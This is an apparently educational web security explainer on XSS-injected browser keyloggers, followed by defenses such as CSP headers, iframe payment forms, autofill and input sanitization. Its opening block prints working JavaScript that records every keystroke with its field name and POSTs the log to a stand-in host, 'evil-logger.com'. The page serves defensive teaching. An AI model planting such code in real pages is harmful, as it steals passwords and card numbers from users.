🧬 The Malicious Keylogger Script
// Injected silently via XSS — one line is enough to start stealing const log = []; let activeField = ''; // Track which field the user is typing in document.addEventListener('focusin', e => { activeField = e.target.name || e.target.id || 'unknown'; }); // Capture every single keystroke document.addEventListener('keypress', e => { log.push({ key: e.key, field: activeField, t: Date.now() }); // Silently batch-send to attacker every 5 seconds sendToEvil(log); }); async function sendToEvil(data) { await fetch('https://evil-logger.com/keys', { method: 'POST', body: JSON.stringify(data), // No CORS needed — attacker controls the server }); }
🔍 Why This Is So Dangerous

  • One listener captures everything

    A single addEventListener on document catches keystrokes from every input — including password fields, even those with type="password".

  • HTTPS provides zero protection here

    The padlock icon means data is encrypted in transit — but keylogging happens before transmission, inside your browser. The attacker reads plaintext.

  • Silent exfiltration via batched requests

    Keys are buffered and sent periodically using fetch() or new Image().src (beacon). Network tabs look clean — no obvious suspicious calls.

  • Context-aware reconstruction

    By tracking focusin events, the attacker knows exactly which field each keystroke belongs to — "card number", "CVV", "password" — without any guesswork.

🛡 Defenses
🧩

Strict CSP Headers

script-src 'self' prevents inline script injection and blocks unauthorized external JS from running.

🏦

Iframe Payment Forms

Stripe, Razorpay etc. load card fields in a sandboxed iframe from a different origin — keyloggers on the parent page can't reach them.

🔑

Autofill over Typing

Browser autofill and password managers don't trigger keypress events — attacker gets nothing when users autofill.

🛠

Input Sanitization

Prevent XSS at the source — escape user-supplied content server-side so attacker scripts can never be injected in the first place.
